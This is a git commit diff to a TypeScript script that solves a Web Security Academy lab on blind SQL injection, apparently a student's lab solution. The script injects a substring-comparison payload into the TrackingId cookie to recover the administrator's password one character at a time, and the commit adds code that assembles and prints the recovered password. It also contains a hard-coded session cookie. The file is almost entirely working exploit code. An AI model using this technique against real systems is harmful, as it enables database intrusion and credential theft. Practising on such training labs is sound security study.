2862ee7edb8f92a2a68e9a8ca4eb9d747bbcfff4
zS1L3NT Mac <zechariahtan144@gmail.com>
2023-11-12 03:19:58 +0800

    ✨ upgrade previous lab

--- src/solutions/lab-conditional-responses.ts
+++ src/solutions/lab-conditional-responses.ts
@@ -5,10 +5,12 @@
 
 import { Sess } from "../base"
 
+const LABID = "0a43003a04cf79b48039177c0016009e"
+
 const iter = async (index: number, char: string) => {
 	return await Sess.req`
 		GET / HTTP/2
-		Host: 0a43003a04cf79b48039177c0016009e.web-security-academy.net
+		Host: ${LABID}.web-security-academy.net
 		Cookie: TrackingId=yAR5zTY0EfdlyjxY'%20and%20substring((select%20password%20from%20users%20where%20username%20%3d%20'administrator')%2c%20${index}%2c%201)%20%3d%20'${char}; session=QzVRiWMkInUFSYvG1cxxr5ZLd1EegYE7
 		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
 		Sec-Ch-Ua-Mobile: ?0
@@ -22,12 +24,13 @@ const iter = async (index: number, char: string) => {
 		Sec-Fetch-Mode: navigate
 		Sec-Fetch-User: ?1
 		Sec-Fetch-Dest: document
-		Referer: https://0a43003a04cf79b48039177c0016009e.web-security-academy.net/filter?category=Accessories
+		Referer: https://${LABID}.web-security-academy.net/filter?category=Accessories
 		Accept-Encoding: gzip, deflate, br
 	`.then(r => r.body().includes("Welcome back!"))
 }
 
 let index = 1
+let password = ""
 const chars = "abcdefghijklmnopqrstuvwxyz0123456789".split("")
 
 for (let i = 0; i < 50; i++) {
@@ -35,6 +38,7 @@ for (let i = 0; i < 50; i++) {
 	for (const char of chars) {
 		if (await iter(index, char)) {
 			console.log(`SUCCESS CHAR ${index}: ${char}`)
+			password += char
 			found = true
 			break
 		}
@@ -47,3 +51,5 @@ for (let i = 0; i < 50; i++) {
 		break
 	}
 }
+
+console.log(`PASSWORD: ${password}`)
